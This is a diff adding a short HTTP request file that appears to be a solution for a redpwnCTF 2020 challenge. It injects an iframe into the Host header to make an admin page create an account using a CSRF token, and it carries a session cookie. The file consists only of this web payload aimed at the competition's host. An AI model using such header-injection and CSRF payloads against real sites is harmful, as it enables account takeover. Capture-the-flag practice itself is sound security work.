@@ -1,0 +1,8 @@
+# hacks
+# __csrftoken__admin_account
+
+GET http://2020.redpwnc.tf:31291/viper/067d755b-2270-4dd7-a9a5-e5de092c85c4 HTTP/1.1
+Host: 2020.redpwnc.tf:31291<iframe src="\admin\create?viperId=ce6e7081-009d-44a2-ab81-e4f3a23c95e4&csrfToken=MjU1NTc0OTYyNA%3D%3D">
+Cookie: connect.sid=s%3Al-AEtvk0GY3UVrpVTBozpRyqNOGC40W_.%2BNf4gy5PlNctGLAAJ0rAESYKteLmTU1I%2FrC1u%2B25bEg
+
+###
